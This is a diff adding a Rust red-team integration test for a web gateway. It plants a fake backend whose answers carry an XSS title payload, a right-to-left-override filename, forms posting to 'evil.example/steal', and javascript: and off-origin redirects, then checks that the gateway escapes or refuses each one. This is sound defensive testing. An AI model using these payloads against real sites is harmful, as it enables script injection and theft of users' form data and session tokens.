@@ -290,3 +290,123 @@ fn a_login_code_opens_one_session_whose_terminal_runs_as_the_member_until_logout
     assert_eq!(http(port, "GET", "/assets/vendor/xterm.js", &[], "").header("Cache-Control"), Some("public, max-age=3600"));
     assert_eq!(http(port, "GET", "/healthz", &[], "").body, "ok");
 }
+
+/// Red team (docs/review/2026-10-27-redteam/REDTEAM.md): what a body answers reaches the page
+/// shell, and a stranger's words reach the body's answer (a document's name in the title, a
+/// grain's origin in a form). A stand-in body (the real helper spawns it on its root-only listener
+/// exactly as it spawns `mini web --body`) answers with planted titles, a form that posts to
+/// another origin, and redirects elsewhere; the real gateway must keep every one inert: the title
+/// escaped in the shell, the CSP forbidding inline script, the session's CSRF token only in forms
+/// that post here, and no redirect off this origin.
+#[test]
+fn a_planted_body_answer_stays_inert_in_the_shell() {
+    let helper = helper_binary();
+    let gateway = PathBuf::from(env!("CARGO_BIN_EXE_mini-web"));
+    let scratch = std::env::temp_dir().join(format!("mini-web-redteam-{}", std::process::id()));
+    let run = PathBuf::from(format!("/tmp/mwr{}", std::process::id() % 100000));
+    let _ = std::fs::remove_dir_all(&scratch);
+    let _ = std::fs::remove_dir_all(&run);
+    std::fs::create_dir_all(scratch.join("state")).unwrap();
+    std::fs::create_dir_all(scratch.join("home")).unwrap();
+    std::fs::create_dir_all(&run).unwrap();
+    let body = scratch.join("fake-body.py");
+    std::fs::write(
+        &body,
+        r#"#!/usr/bin/env python3
+# A stand-in for `mini web --body`: serves the inherited listener on fd 3 with planted answers.
+import socket
+listener = socket.socket(fileno=3)
+TITLE = "</title><script>alert(1)</script>\u202egnp.exe"
+STAGE = ('<form method="post" action="https://evil.example/steal"><input name="x"></form>'
+         '<form method="post" action="//evil.example/x"></form>'
+         '<form method="post" action="/doc/a/append"><input name="text"></form>')
+while True:
+    conn, _ = listener.accept()
+    data = b""
+    while b"\r\n\r\n" not in data:
+        chunk = conn.recv(65536)
+        if not chunk:
+            break
+        data += chunk
+    path = data.split(b"\r\n", 1)[0].split(b" ")[1].decode()
+    if path == "/redirect-js":
+        head, html = "HTTP/1.1 303 See Other\r\nLocation: javascript:alert(1)\r\n", ""
+    elif path == "/redirect-far":
+        head, html = "HTTP/1.1 303 See Other\r\nLocation: //evil.example/\r\n", ""
+    else:
+        head, html = "HTTP/1.1 200 OK\r\nX-Mini-Title: " + TITLE + "\r\n", STAGE
+    payload = html.encode()
+    conn.sendall((head + "Content-Type: text/html\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(payload)).encode() + payload)
+    conn.close()
+"#,
+    )
+    .unwrap();
+    std::fs::set_permissions(&body, std::os::unix::fs::PermissionsExt::from_mode(0o700)).unwrap();
+    let config = scratch.join("dev.json");
+    std::fs::write(
+        &config,
+        format!(
+            "{{\"mini\":\"{b}\",\"host\":\"{t}\",\"config\":\"/dev/null\",\"socket\":\"/dev/null\",\"wrapper\":\"{t}\",\"sessions\":{{\"alice\":{{\"workspace\":\"{s}/ws\",\"home\":\"{s}/home\"}}}}}}",
+            b = body.display(),
+            t = if Path::new("/usr/bin/true").exists() { "/usr/bin/true" } else { "/bin/true" },
+            s = scratch.display()
+        ),
+    )
+    .unwrap();
+    let sock = run.join("spawn.sock");
+    let helper_child = Command::new(&helper)
+        .arg("--dev").arg(&config).arg("--socket").arg(&sock).arg("--state").arg(scratch.join("state")).arg("--run").arg(&run)
+        .stdout(Stdio::null()).stderr(std::fs::File::create(scratch.join("helper.log")).unwrap())
+        .spawn()
+        .unwrap();
+    let port = free_port();
+    let origin = format!("http://127.0.0.1:{port}");
+    let gateway_child = Command::new(&gateway)
+        .args(["--listen", &format!("127.0.0.1:{port}"), "--helper"]).arg(&sock)
+        .args(["--origin", &origin, "--frame-src", "https://*.demo.dregg.online"])
+        .stdout(Stdio::null()).stderr(std::fs::File::create(scratch.join("gateway.log")).unwrap())
+        .spawn()
+        .unwrap();
+    let logs = || format!("helper: {}\ngateway: {}", std::fs::read_to_string(scratch.join("helper.log")).unwrap_or_default(), std::fs::read_to_string(scratch.join("gateway.log")).unwrap_or_default());
+    let _procs = Procs(vec![helper_child, gateway_child], run.clone());
+    let deadline = Instant::now() + Duration::from_secs(20);
+    while Instant::now() < deadline && !(sock.exists() && TcpStream::connect(("127.0.0.1", port)).is_ok()) {
+        std::thread::sleep(Duration::from_millis(50));
+    }
+    let code = mini_web_spawn::new_token().unwrap();
+    std::fs::write(
+        scratch.join("state/logins").join(format!("{}.json", mini_web_spawn::sha256_hex(code.as_bytes()))),
+        format!("{{\"name\":\"alice\",\"expires\":{}}}", mini_web_spawn::now() + 600),
+    )
+    .unwrap();
+    let login = http(port, "POST", "/login", &[("Origin", origin.as_str()), ("Sec-Fetch-Site", "same-origin")], &format!("code={code}"));
+    assert_eq!(login.status, 303, "{}\n{}", login.body, logs());
+    let cookie = login.header("Set-Cookie").unwrap().split(';').next().unwrap().to_owned();
+    let jar = [("Cookie", cookie.as_str())];
+
+    let page = http(port, "GET", "/doc/planted", &jar, "");
+    assert_eq!(page.status, 200, "{}\n{}", page.body, logs());
+    let lower = page.body.to_ascii_lowercase();
+    assert!(!lower.contains("<script>alert"), "the planted title is escaped in <title>, <h1> and data-title:\n{}", page.body);
+    assert!(page.body.contains("&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;[U+202E]gnp.exe"), "{}", page.body);
+    let csp = page.header("Content-Security-Policy").expect("a CSP");
+    let script = csp.split(';').map(str::trim).find(|d| d.starts_with("script-src")).expect("a script-src");
+    assert_eq!(script, "script-src 'self'", "no inline script, no eval, no other origin: {csp}");
+    assert!(csp.contains("default-src 'none'") && csp.contains("base-uri 'none'") && csp.contains("frame-ancestors 'none'"), "{csp}");
+    assert!(csp.contains("form-action 'self' https://*.demo.dregg.online"), "a grain's bootstrap may post to the grain origins and nowhere else: {csp}");
+    let stage = page.body.split("<main").nth(1).unwrap();
+    let forms: Vec<&str> = stage.split("<form").skip(1).collect();
+    assert_eq!(forms.len(), 3, "{stage}");
+    assert!(!forms[0].contains("csrf") && !forms[1].contains("csrf"), "the session's token never goes to another origin:\n{stage}");
+    assert!(forms[2].contains("name=\"csrf\""), "a same-origin form carries it:\n{stage}");
+
+    let fragment = http(port, "GET", "/doc/planted", &[("Cookie", cookie.as_str()), ("X-Mini-Fragment", "1")], "");
+    let title = fragment.header("X-Mini-Title").unwrap();
+    assert!(!title.contains('\r') && !title.contains('\n'), "{title:?}");
+
+    for far in ["/redirect-js", "/redirect-far"] {
+        let reply = http(port, "GET", far, &jar, "");
+        assert_ne!(reply.status, 303, "{far}: a body redirect off this origin is refused: {:?}", reply.header("Location"));
+        assert!(reply.header("Location").is_none(), "{far}");
+    }
+}
